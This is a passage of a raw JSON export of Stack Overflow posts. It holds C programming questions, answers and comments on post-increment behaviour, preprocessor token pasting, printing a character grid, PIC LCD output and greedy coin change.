"https://lh3.googleusercontent.com/-qVFzd4Owl1Q/AAAAAAAAAAI/AAAAAAAAAAA/1COV64mkRSo/photo.jpg?sz=128", "display_name": "skyconfusion", "link": "https://stackoverflow.com/users/4576973/skyconfusion"}, "edited": false, "score": 1, "creation_date": 1551897063, "post_id": 55029921, "comment_id": 96812428, "body": "Only 0 is false in C programing."}, {"owner": {"reputation": 1, "user_id": 2481729, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ovgcm.jpg?s=128&g=1", "display_name": "Bala Krishna", "link": "https://stackoverflow.com/users/2481729/bala-krishna"}, "edited": false, "score": 0, "creation_date": 1551897980, "post_id": 55029921, "comment_id": 96812853, "body": "<a href=\"https://stackoverflow.com/questions/226002/whats-the-difference-between-x-x-vs-x\" title=\"whats the difference between x x vs x\">stackoverflow.com/questions/226002/&hellip;</a>"}], "tags": [], "owner": {"reputation": 1, "user_id": 2481729, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ovgcm.jpg?s=128&g=1", "display_name": "Bala Krishna", "link": "https://stackoverflow.com/users/2481729/bala-krishna"}, "is_accepted": false, "score": -1, "last_activity_date": 1551896933, "creation_date": 1551896933, "answer_id": 55029921, "question_id": 55029829, "link": "https://stackoverflow.com/questions/55029829/why-the-output-is-6-and-not-7/55029921#55029921", "title": "Why, the output is 6 and not 7?", "body": "<p>Since the if condition 5-6 = -1 is false, z = z++ is never executed. So, simply executing only z = --z and making the answer 6</p>\n"}], "owner": {"reputation": 123, "user_id": 4576973, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-qVFzd4Owl1Q/AAAAAAAAAAI/AAAAAAAAAAA/1COV64mkRSo/photo.jpg?sz=128", "display_name": "skyconfusion", "link": "https://stackoverflow.com/users/4576973/skyconfusion"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 73, "favorite_count": 0, "closed_date": 1551898284, "answer_count": 2, "score": 0, "last_activity_date": 1551900009, "creation_date": 1551896571, "question_id": 55029829, "link": "https://stackoverflow.com/questions/55029829/why-the-output-is-6-and-not-7", "closed_reason": "Duplicate", "title": "Why, the output is 6 and not 7?", "body": "<p>The following C code executes correctly but not as expected. Post increment operator here in <code>z=z++</code> is creating confusion here. I may not be able to figure out silly mistake/concept,  Can I have a brief explanation or some helpful link please.</p>\n\n<pre><code> #include&lt;stdio.h&gt;\n    int main()\n    {\n        int x=5,y=6,z=7;\n        if(x-y)\n\n            z=z++;\n            z=--z;\n\n        printf(\"%d\",z);\n    }\n</code></pre>\n"}, {"tags": ["c", "compilation", "macros", "preprocessor"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1551895915, "post_id": 55029623, "comment_id": 96811923, "body": "Forget it. Trying to make a lazy implemetation for keywords is a going nowhere and makes your invented code hard to read."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1551895927, "post_id": 55029623, "comment_id": 96811930, "body": "Avoid preprocessor magic; it makes code unreadable.  You can concatenate tokens in the replacement text of a macro with <code>##</code> \u2014 <code>#define C(a, b) a ## b</code> and then <code>C(A, B)</code> would more or less do what you want; you just have to evaluate the expressions before concatenating: <code>#define E(a) a</code> \u2014 <code>#define C(a, b) E(a) ## E(b)</code> and <code>C(A,B)</code>.  But that&#39;s repulsive, especially for a split keyword."}, {"owner": {"reputation": 17, "user_id": 8412969, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-SLpockHKx7o/AAAAAAAAAAI/AAAAAAAABEQ/bbD2daa6hbo/photo.jpg?sz=128", "display_name": "Adria Arroyo", "link": "https://stackoverflow.com/users/8412969/adria-arroyo"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551896856, "post_id": 55029623, "comment_id": 96812348, "body": "@JonathanLeffler I tryed your idea, and it doesn&#39;t work for me. Gcc responds with: pasting &quot;)&quot; and &quot;E&quot; does not give a valid preprocessing token  #define C(a, b) E(a)##E(b)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1551896979, "post_id": 55029623, "comment_id": 96812389, "body": "OK; as you can tell, I didn&#39;t test it.  It&#39;s doable (the concatenation of tokens defined via macros); there are answers about how to do it (some written by me in times past).  It isn&#39;t a good idea \u2014 that&#39;s the take home.   (Working set of macros: <code>#define A f</code> \u2014  <code>#define B or</code> \u2014   <code>#define E(a, b) a ## b</code> \u2014  <code>#define C(a, b) E(a, b)</code> \u2014  `` \u2014  <code>C(A,B)</code> \u2014 output, <code>for</code>.)"}, {"owner": {"reputation": 17, "user_id": 8412969, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-SLpockHKx7o/AAAAAAAAAAI/AAAAAAAABEQ/bbD2daa6hbo/photo.jpg?sz=128", "display_name": "Adria Arroyo", "link": "https://stackoverflow.com/users/8412969/adria-arroyo"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551897167, "post_id": 55029623, "comment_id": 96812476, "body": "@JonathanLeffler Can you please provide the link? :)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551897444, "post_id": 55029623, "comment_id": 96812614, "body": "<a href=\"https://stackoverflow.com/questions/1489932/how-to-concatenate-twice-with-the-c-preprocessor-and-expand-a-macro-as-in-arg\" title=\"how to concatenate twice with the c preprocessor and expand a macro as in arg\">stackoverflow.com/questions/1489932/&hellip;</a>; <a href=\"https://stackoverflow.com/questions/195975/how-to-make-a-char-string-from-a-c-macros-value\" title=\"how to make a char string from a c macros value\">stackoverflow.com/questions/195975/&hellip;</a>"}, {"owner": {"reputation": 17, "user_id": 8412969, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-SLpockHKx7o/AAAAAAAAAAI/AAAAAAAABEQ/bbD2daa6hbo/photo.jpg?sz=128", "display_name": "Adria Arroyo", "link": "https://stackoverflow.com/users/8412969/adria-arroyo"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551899043, "post_id": 55029623, "comment_id": 96813301, "body": "@JonathanLeffler You&#39;re awesome!"}], "answers": [{"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551897518, "post_id": 55029680, "comment_id": 96812649, "body": "I think you need object-like macros for A and B, not function-like macros \u2014 as shown in the question."}], "tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": true, "score": 4, "last_activity_date": 1551899382, "last_edit_date": 1551899382, "creation_date": 1551895967, "answer_id": 55029680, "question_id": 55029623, "link": "https://stackoverflow.com/questions/55029623/preprocessor-directive-to-create-keywords-in-c/55029680#55029680", "title": "Preprocessor directive to create keywords in C", "body": "<p>making</p>\n\n<pre><code>#define A f\n#define B or\n#define C(x, y) x##y\n#define D(x,y) C(x,y)\n</code></pre>\n\n<p>then</p>\n\n<pre><code>D(A, B)(i = 0; i &lt; 10; i++)\n</code></pre>\n\n<p>will be rewritten as </p>\n\n<pre><code>for (i = 0; i &lt; 10; i++)\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 8412969, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-SLpockHKx7o/AAAAAAAAAAI/AAAAAAAABEQ/bbD2daa6hbo/photo.jpg?sz=128", "display_name": "Adria Arroyo", "link": "https://stackoverflow.com/users/8412969/adria-arroyo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 55029680, "answer_count": 1, "score": 1, "last_activity_date": 1551899382, "creation_date": 1551895766, "question_id": 55029623, "link": "https://stackoverflow.com/questions/55029623/preprocessor-directive-to-create-keywords-in-c", "title": "Preprocessor directive to create keywords in C", "body": "<p>I want to create this...</p>\n\n<pre><code>int main(void) {\n  int i;\n\n  for(i = 0; i &lt; 10; i++){\n    //Not an important Code\n  }\n  return 0;\n}\n</code></pre>\n\n<p>in a fancier way, to create crazy ideas!<br>\nIs it possible to rewrite it like this?</p>\n\n<pre><code>#define A f\n#define B or\n\nint main(void) {\n  int i;\n\n  AB(i = 0; i &lt; 10; i++){\n    //Not an important Code\n  }\n  return 0;\n}\n</code></pre>\n\n<p>I need to know if it's possible to create instrctions like a simple <em>for</em> composed by diferent <em>#defines</em></p>\n"}, {"tags": ["c", "arrays", "2d"], "comments": [{"owner": {"reputation": 4024, "user_id": 3307686, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5dd8d815759c23dd52428c7cc0c35324?s=128&d=identicon&r=PG&f=1", "display_name": "Mike Holt", "link": "https://stackoverflow.com/users/3307686/mike-holt"}, "edited": false, "score": 0, "creation_date": 1551895551, "post_id": 55029434, "comment_id": 96811729, "body": "You should show how your <code>map</code> struct is defined, and explain what the fields mean. For example: Is <code>map_loaded.height</code> the number of rows in the printed grid? Is <code>map_loaded.p_char</code> null-terminated? What other data members are in the <code>map</code> struct?"}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1551895858, "post_id": 55029434, "comment_id": 96811891, "body": "Print &#39;\\n&#39; for newline."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1551896065, "post_id": 55029434, "comment_id": 96811996, "body": "<b><code>*p[i]</code> is bad!</b> either way you look at it ... <code>*p</code> has type <code>char</code>; you cannot index a char ... <code>p[i]</code> has type <code>char</code>; you cannot dereference a char."}, {"owner": {"reputation": 348, "user_id": 11019146, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-uN1b_TeM4-s/AAAAAAAAAAI/AAAAAAAAACE/el4YYLCuRvY/photo.jpg?sz=128", "display_name": "Patrick", "link": "https://stackoverflow.com/users/11019146/patrick"}, "reply_to_user": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1551896348, "post_id": 55029434, "comment_id": 96812111, "body": "@pmg can you elaborate on what the problem is with dereferencing a char. I haven&#39;t heard of that being an issue before."}, {"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "reply_to_user": {"reputation": 348, "user_id": 11019146, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-uN1b_TeM4-s/AAAAAAAAAAI/AAAAAAAAACE/el4YYLCuRvY/photo.jpg?sz=128", "display_name": "Patrick", "link": "https://stackoverflow.com/users/11019146/patrick"}, "edited": false, "score": 0, "creation_date": 1551897694, "post_id": 55029434, "comment_id": 96812720, "body": "@Patrick: do you think <code>*(42)</code> (dereference the integer 42) is legal? What about <code>*(&quot;foo&quot;)</code> (dereference a (string converted to a) pointer)? Or <code>*(&quot;foo&quot;[2])</code> (dereference a char)?"}, {"owner": {"reputation": 348, "user_id": 11019146, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-uN1b_TeM4-s/AAAAAAAAAAI/AAAAAAAAACE/el4YYLCuRvY/photo.jpg?sz=128", "display_name": "Patrick", "link": "https://stackoverflow.com/users/11019146/patrick"}, "edited": false, "score": 0, "creation_date": 1551897834, "post_id": 55029434, "comment_id": 96812792, "body": "Ah, I think I was misunderstanding what it was doing, you definitely do not want to go to memory location b in any circumstance. Thanks."}], "answers": [{"comments": [{"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 1, "creation_date": 1551896146, "post_id": 55029707, "comment_id": 96812037, "body": "<b><code>*p[i]</code> is bad!</b> either way you look at it ... <code>*p</code> has type <code>char</code>; you cannot index a char ... <code>p[i]</code> has type <code>char</code>; you cannot dereference a char."}], "tags": [], "owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "is_accepted": false, "score": 0, "last_activity_date": 1551897112, "last_edit_date": 1551897112, "creation_date": 1551896091, "answer_id": 55029707, "question_id": 55029434, "link": "https://stackoverflow.com/questions/55029434/create-a-2d-array-from-a-1d-array/55029707#55029707", "title": "Create a 2D array from a 1D array", "body": "<p>As all you need is a new line after every 10 characters, just check if you have printed 10 characters since last adition of new line.</p>\n\n<pre><code>void print_map(map map_loaded){\nchar *p=map_loaded.p_char; \nint height=map_loaded.height; \nfor(int i=0; i&lt;height; i++){ \nprintf(\"%c\", p[i]);\n\nif( (i+1)%10==0)\nprintf(\"\\n\");\n}\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 11135935, "user_type": "registered", "profile_image": "https://graph.facebook.com/2337951729601055/picture?type=large", "display_name": "Candide Thovexo", "link": "https://stackoverflow.com/users/11135935/candide-thovexo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1551950753, "creation_date": 1551895002, "question_id": 55029434, "link": "https://stackoverflow.com/questions/55029434/create-a-2d-array-from-a-1d-array", "title": "Create a 2D array from a 1D array", "body": "<p>As said in the title, I have a function \"load\" that returns returns a structure which contains 2 int and an array of characters. This array is on 1D, and looks like : [################  ### $  $  ### #  .# ###  . #.@ ###$# *   ###  ###############]\nAnd I would like to print it as :</p>\n\n<pre><code>##########\n######  ##\n# $  $  ##\n# #  .# ##\n#  . #.@ #\n##$# *   #\n##  ######\n##########\n</code></pre>\n\n<p>knowing that the width is here 10. \nSo my question is how to, every 10 characters, manage to go back to the next line...?\nHere is what I've written so far :</p>\n\n<pre><code>void print_map(map map_loaded){\n    char *p=map_loaded.p_char;\n    int height=map_loaded.height;\n    for(int i=0; i&lt;height; i++){\n            printf(\"%c\", *p[i]);\n        }\n</code></pre>\n\n<p>As you can see, I just know how to read every character, but I have no clue about how to go back to line...\nI would really appreciate if someone could read my code and give me his/her feedback... Thanks in advance !</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 4187, "user_id": 5567382, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d204353cb4fa94da57ddf180e108cd1b?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Jager", "link": "https://stackoverflow.com/users/5567382/thomas-jager"}, "edited": false, "score": 1, "creation_date": 1551894517, "post_id": 55029269, "comment_id": 96811247, "body": "The way to go about doing this varies a lot on the exact LCD being used. From there, take a look at the data sheet. It will tell you how to interface with the LCD."}], "answers": [{"tags": [], "owner": {"reputation": 81, "user_id": 10516986, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-_adTfIoV9Jg/AAAAAAAAAAI/AAAAAAAAAIA/LOgUadOZCUY/photo.jpg?sz=128", "display_name": "Sakthivel sockkalingam", "link": "https://stackoverflow.com/users/10516986/sakthivel-sockkalingam"}, "is_accepted": false, "score": 2, "last_activity_date": 1554790065, "last_edit_date": 1554790065, "creation_date": 1552483345, "answer_id": 55142936, "question_id": 55029269, "link": "https://stackoverflow.com/questions/55029269/lcd-display-with-pic16f877a/55142936#55142936", "title": "LCD display with PIC16F877A", "body": "<pre><code>     I used MPLAB X IDE V5.0.\n\n\n\n\n\n// CONFIG\n                    #pragma config FOSC = EXTRC     // Oscillator Selection bits (RC oscillator)\n                    #pragma config WDTE = OFF       // Watchdog Timer Enable bit (WDT disabled)\n                    #pragma config PWRTE = OFF      // Power-up Timer Enable bit (PWRT disabled)\n                    #pragma config BOREN = OFF      // Brown-out Reset Enable bit (BOR disabled)\n                    #pragma config LVP = OFF        // Low-Voltage (Single-Supply) In-Circuit Serial Programming Enable bit (RB3 is digital I/O, HV on MCLR must be used for programming)\n                    #pragma config CPD = OFF        // Data EEPROM Memory Code Protection bit (Data EEPROM code protection off)\n                    #pragma config WRT = OFF        // Flash Program Memory Write Enable bits (Write protection off; all program memory may be written to by EECON control)\n                    #pragma config CP = OFF         // Flash Program Memory Code Protection bit (Code protection off)\n\n\n\n                #include &lt;xc.h&gt;\n                void command(unsigned char cmd);\n                void data(unsigned char dat);\n                void display_string(const char *s);\n                void delay();\n\n            void main(void) {\n\n                TRISB=0X00;\n                PORTB=0X00;\n                TRISE=0X00;\n                PORTE=0X00;\n                ADCON1=0X06;// reference the Hyperlink\n\n                command(0x01);//clear display\n                delay();\n                command(0x0C);//Turn on the display and off cursor blinking\n                delay();\n                command(0x05);//increment the cursor after byte each byte written\n                delay();\n                command(0x38);//set 8-bit interface \n                delay();\n                command(0x80);//set DRAM address\n                delay();\n\n                while(1)\n                {\n                    command(0x80);//set DRAM address\n\n                    display_string(\"A\"); //display A \n                     data('A'); // or dat like A\n                     data(65);  // ASCII key A=65\n\n\n\n                }\n\n\n            }\n\n            void command(unsigned char cmd)\n            {\n                PORTE=0X04;\n                PORTB=cmd;\n                delay();\n                RE2=0;\n\n            }\n            void data(unsigned char dat)\n            {\n                PORTE=0X05;\n                PORTB=data;\n                delay();\n                RE2=0;\n\n            }\n\n            void display_string(const char *s)\n            {\n                while(*s)\n                    data(*s++);\n            }\n            void delay()\n            {\n                for(int i=0;i&lt;255;i++);\n            }\n</code></pre>\n\n<p><a href=\"http://ww1.microchip.com/downloads/en/devicedoc/39582b.pdf\" rel=\"nofollow noreferrer\">Reference</a>    </p>\n"}], "owner": {"reputation": 1, "user_id": 11161314, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-CAn_RnLEy10/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdGbV32nezL7ALglVwNaqbKK-eHCg/mo/photo.jpg?sz=128", "display_name": "shwet", "link": "https://stackoverflow.com/users/11161314/shwet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1554790065, "creation_date": 1551894373, "question_id": 55029269, "link": "https://stackoverflow.com/questions/55029269/lcd-display-with-pic16f877a", "title": "LCD display with PIC16F877A", "body": "<p>I am new to PIC programming. I am strucked with a task, where i have \nto display a letter \"A\" on LCD when i press a particular switch three times.Please help me if anyone knows. Thanks in advance.</p>\n"}, {"tags": ["c", "greedy"], "comments": [{"owner": {"reputation": 2956, "user_id": 2207924, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d97be4271939adcd1eec201cd777f57?s=128&d=identicon&r=PG", "display_name": "JeffUK", "link": "https://stackoverflow.com/users/2207924/jeffuk"}, "edited": false, "score": 3, "creation_date": 1551893148, "post_id": 55028888, "comment_id": 96810461, "body": "Who told you to use a greedy approach? Did you ask them what they mean by &#39;a greedy approach&#39;?"}, {"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1551893303, "post_id": 55028888, "comment_id": 96810539, "body": "This can be solved without a loop; in each iteration, exactly 1 of the cases will be true, and will never be true in any future iteration."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1551893368, "post_id": 55028888, "comment_id": 96810581, "body": "While the compiler doesn&#39;t care about spaces, empty lines, indentation or comments, those things are very important to humans attempting to read and understand your code."}, {"owner": {"reputation": 120, "user_id": 4080322, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d28464b305895662d6d0defe2baf7542?s=128&d=identicon&r=PG&f=1", "display_name": "Divyanshu Varma", "link": "https://stackoverflow.com/users/4080322/divyanshu-varma"}, "edited": false, "score": 0, "creation_date": 1551893854, "post_id": 55028888, "comment_id": 96810881, "body": "By &#39;a greedy approach&#39; I mean a greedy algorithm. So is this program using a greedy algorithm? How do I prove it?"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1551894255, "post_id": 55028888, "comment_id": 96811100, "body": "@DivyanshuVarma there is no limit on the greedy because it is possible to add any useless computation, but it is easily possible to do more greedy, look my answer"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551977629, "post_id": 55028888, "comment_id": 96848131, "body": "Since the question is about the minimum number of coins. Are we discussing English pounds or American coins or something else?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551977825, "post_id": 55028888, "comment_id": 96848244, "body": "OT:  regarding: <code>scanf(&quot;%d&quot;,&amp;sum);</code>  Always check the returned value (not the parameter values) to assure the operation was successful"}], "answers": [{"comments": [{"owner": {"reputation": 2956, "user_id": 2207924, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d97be4271939adcd1eec201cd777f57?s=128&d=identicon&r=PG", "display_name": "JeffUK", "link": "https://stackoverflow.com/users/2207924/jeffuk"}, "edited": false, "score": 0, "creation_date": 1551893501, "post_id": 55029000, "comment_id": 96810668, "body": "How does this answer OP&#39;s questions?"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 2956, "user_id": 2207924, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d97be4271939adcd1eec201cd777f57?s=128&d=identicon&r=PG", "display_name": "JeffUK", "link": "https://stackoverflow.com/users/2207924/jeffuk"}, "edited": false, "score": 0, "creation_date": 1551894780, "post_id": 55029000, "comment_id": 96811385, "body": "@JeffUK answer corrected to do more greedy ... damned"}], "tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": false, "score": 1, "last_activity_date": 1551895110, "last_edit_date": 1551895110, "creation_date": 1551893451, "answer_id": 55029000, "question_id": 55028888, "link": "https://stackoverflow.com/questions/55028888/determine-the-minimum-number-of-coins-required-for-giving-a-change-using-greedy/55029000#55029000", "title": "Determine the minimum number of coins required for giving a change using greedy approach", "body": "<p>Your code is not enough greedy because it can be worst :</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main(){\n  int hundreds=0,tens=0,ones=0,sum=0;\n\n  printf(\"Enter a sum of money in range 1 to 999\\n\");\n  if ((scanf(\"%d\",&amp;sum) == 1) &amp;&amp; (sum &gt;= 1) &amp;&amp; (sum &lt;= 999)) {\n    while(sum!=0) {\n      if (sum&lt;10&amp;&amp;sum&gt;=1){\n        ones += 1;\n        sum -= 1;\n      }\n      else if(sum&gt;=10&amp;&amp;sum&lt;100){\n        tens += 1;\n        sum -= 10;\n      }\n      else if(sum&gt;=100&amp;&amp;sum&lt;=999){\n        hundreds += 1;\n        sum -= 100;\n      }\n      else{ /* impossible case in fact */\n        printf(\"Error\");\n        exit(0);\n      }\n    }\n\n    printf(\"%d $100, %d $10, %d $1\\n\",hundreds,tens,ones);\n  }\n  return 0;\n}\n</code></pre>\n\n<p>Compilation and execution:</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantic -Wextra g.c\npi@raspberrypi:/tmp $ ./a.out\nEnter a sum of money in range 1 to 999\n997\n9 $100, 9 $10, 7 $1\n</code></pre>\n\n<hr>\n\n<blockquote>\n  <p>How do I prove that the program is correct </p>\n</blockquote>\n\n<p>A (greedy) way to prove the code is correct is to use the brutal force to check all from result from 1 to 999 :</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nint main(){\n  int n;\n\n  for (n = 1; n &lt;= 999; ++n) {\n    /* the algo */\n    int hundreds=0,tens=0,ones=0, sum = n;\n\n    while(sum!=0) {\n      if (sum&lt;10&amp;&amp;sum&gt;=1){\n        ones += 1;\n        sum -= 1;\n      }\n      else if(sum&gt;=10&amp;&amp;sum&lt;100){\n        tens += 1;\n        sum -= 10;\n      }\n      else if(sum&gt;=100&amp;&amp;sum&lt;=999){\n        hundreds += 1;\n        sum -= 100;\n      }\n      else{ /* impossible case in fact */\n        printf(\"Error\");\n        exit(0);\n      }\n    }\n\n    /* check */\n    if ((hundreds*100 + tens*10 + ones) != n) {\n      printf(\"error for %d : %d $100, %d $10, %d $1\\n\",n, hundreds,tens,ones);\n      exit(0);\n    }\n  }\n  puts(\"all ok\");\n  return 0;\n}\n</code></pre>\n\n<p>Compilation and execution :</p>\n\n<pre><code>pi@raspberrypi:/tmp $ gcc -pedantic -Wextra g.c\npi@raspberrypi:/tmp $ ./a.out\nall ok\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": true, "score": 4, "last_activity_date": 1551894651, "last_edit_date": 1551894651, "creation_date": 1551894256, "answer_id": 55029237, "question_id": 55028888, "link": "https://stackoverflow.com/questions/55028888/determine-the-minimum-number-of-coins-required-for-giving-a-change-using-greedy/55029237#55029237", "title": "Determine the minimum number of coins required for giving a change using greedy approach", "body": "<p>This is indeed greedy approach but you need to reverse the order of if-then-else. In general, <em>greedy</em> means to consume at the current moment the biggest quantity that you can consume.</p>\n\n<p>You need to check first for the biggest coin.  There is no need for while-loop.  </p>\n\n<pre><code>if(sum&gt;=100) {\n  hundreds=sum/100;\n  sum-=hundreds*100;\n}\nif(sum&gt;=10){\n  tens=sum/10;\n  sum-=tens*10;\n} \nones = sum; \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1551979397, "creation_date": 1551979397, "answer_id": 55049610, "question_id": 55028888, "link": "https://stackoverflow.com/questions/55028888/determine-the-minimum-number-of-coins-required-for-giving-a-change-using-greedy/55049610#55049610", "title": "Determine the minimum number of coins required for giving a change using greedy approach", "body": "<p>The following proposed code:</p>\n\n<ol>\n<li>cleanly 